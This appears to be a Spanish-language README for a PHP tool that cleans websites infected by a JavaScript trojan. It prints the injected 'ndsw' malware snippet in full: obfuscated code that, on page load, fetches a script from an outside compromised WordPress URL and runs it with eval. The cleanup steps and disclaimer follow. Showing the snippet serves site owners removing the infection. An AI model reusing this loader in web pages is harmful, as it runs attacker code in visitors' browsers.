# remove-trojan-js

¿Tú sitio web (wordpress, sitio web general, etc.) se infectó con este fragmento de código (los Javascript)?
```
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//unitedfc.com.mx/wp-admin/huge-it-google-map-custom-icons/huge-it-google-map-custom-icons.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};
```
Si es así sigue estos pasos para limpiarlos: 
* Sube el archivo (remove-trojan-js.php) al servidor
* Cambiar la ruta absoluta desde donde se empezará la limpieza (línea 28 del archivo remove-trojan-js.php)
* Ejecutar el script vía web (https://dominio.com/remove-trojan-js.php) o por la terminal (php remove-trojan-js.php)





**Disclaimer**: ejecutar bajo tu responsabilidad. Siempre realizar una prueba en ambiente controlado (sandbox/desarrollo), antes de aplicarlo a producción.
